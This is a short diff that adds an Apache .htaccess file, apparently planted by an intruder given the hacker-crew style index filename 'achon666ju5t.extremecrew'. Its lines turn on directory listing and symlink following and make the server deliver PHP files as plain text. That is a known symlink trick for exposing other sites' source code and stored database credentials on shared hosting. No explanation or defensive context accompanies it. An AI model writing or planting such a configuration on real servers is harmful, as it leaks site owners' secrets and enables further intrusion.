@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+AddType txt .php
+AddHandler txt .php
